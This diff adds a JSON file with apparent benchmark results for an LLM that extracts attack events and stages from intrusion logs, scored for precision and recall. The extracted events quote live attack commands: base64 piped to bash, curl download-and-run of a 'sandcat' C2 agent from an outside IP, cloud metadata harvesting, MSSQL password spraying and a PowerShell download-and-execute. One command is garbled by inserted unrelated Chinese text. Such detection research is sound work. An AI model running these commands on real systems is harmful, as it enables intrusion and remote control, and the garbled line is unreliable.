@@ -1,0 +1,120 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "base64 -d",
+        "stage": "Execution"
+      },
+      {
+        "command": "echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Execution"
+      },
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Execution"
+      },
+      {
+        "command": "chmod +x sandcat-linux",
+        "stage": "Persistence"
+      },
+      {
+        "command": "whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "ifconfig",
+        "stage": "Discovery"
+      },
+      {
+        "command": "ping -c 1 10.67.200.200",
+        "stage": "Discovery"
+      },
+      {
+        "command": "arp -a",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sh -c ls -l /proc/[0-9]*/fd/[0-9]* | grep socket:",
+        "stage": "Discovery"
+      },
+      {
+        "command": "wget --connect-timeout=7 --tries=1 --dns-timeout=7 -q --header=Metadata:true -O - http://169.254.169.254/metadata/instance?api-version=2019-03-11",
+        "stage": "Collection"
+      },
+      {
+        "command": "curl --connect-timeout 7 -s --header='Metadata:true' http://169.254.169.254/metadata/instance?api-version=\u4f4e\u8d28\u91cf\u5185\u5bb9\u5df2\u88ab\u79fb\u9664\u3002\u5982\u9700\u5e2e\u52a9\uff0c\u8bf7\u91cd\u65b0\u63cf\u8ff0\u60a8\u7684\u95ee\u9898\u6216\u9700\u6c42\uff0c\u4ee5\u4fbf\u6211\u4eec\u80fd\u591f\u63d0\u4f9b\u66f4\u6709\u6548\u7684\u652f\u6301\u3002\u5982\u679c\u6709\u5177\u4f53\u7684\u4efb\u52a1\u6216\u662f\u9700\u8981\u89e3\u51b3\u7684\u95ee\u9898\uff0c\u8bf7\u8be6\u7ec6\u8bf4\u660e\u3002\u5982\u679c\u662f\u5728\u5c1d\u8bd5\u7406\u89e3\u67d0\u4e2a\u6982\u5ff5\u6216\u8005\u6280\u672f\uff0c\u4e5f\u8bf7\u5177\u4f53\u6307\u51fa\u60a8\u60f3\u8981\u4e86\u89e3\u7684\u5185\u5bb9\u548c\u80cc\u666f\u73af\u5883\u3002\u8fd9\u6837\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u66f4\u597d\u5730\u4e3a\u60a8\u670d\u52a1\u30022019-03-11",
+        "stage": "Collection"
+      },
+      {
+        "command": "timeout 600 python -m SimpleHTTPServer 8079",
+        "stage": "Collection"
+      },
+      {
+        "command": "sh -c mkdir -p fscan && unzip -o -d ./fscan fscan-main.zip && chmod +x ./fscan/main && ./fscan/main -m mssql -h 192.168.0.0/24 -user sa -pwd Sa123456",
+        "stage": "Discovery"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\\Users\\Public\\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid a2b4d5-c2da-adfa-fada-a2ba-dfad4f1498314252 -server ht...",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attack begins with an intruder gaining initial access using both Base64-encoded Bash shell commands and direct URL downloads for 'sandcat-linux'. After executing these commands, they ensure persistence by changing file permissions and background processes. The attacker then proceeds with reconnaissance activities such as checking system information ('whoami', 'ifconfig'), scanning active sockets, and identifying potential targets within the network. This phase also includes collection actions where metadata from cloud services and local HTTP server setup suggest ongoing exfiltration attempts. Additionally, there\u2019s an attempt to discover MSSQL databases and perform lateral movements through PowerShell scripts designed to spread further within the network by deploying additional malicious software. Continuous command-and-control communications over HTTPS indicate a well-established backdoor presence post-compromise.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 31049,
+      "completion_tokens": 4123,
+      "total_tokens": 35172,
+      "wall_clock_s": 81.519,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.47058823529411764,
+      "recall": 0.7272727272727273,
+      "f1": 0.5714285714285714,
+      "tp": 8,
+      "fp": 9,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.17647058823529413,
+      "recall": 0.42857142857142855,
+      "f1": 0.25,
+      "tp": 3,
+      "fp": 14,
+      "fn": 4,
+      "recall_partial": 0.5
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 31049,
+      "completion_tokens": 4123,
+      "total_tokens": 35172,
+      "wall_clock_s": 81.519,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
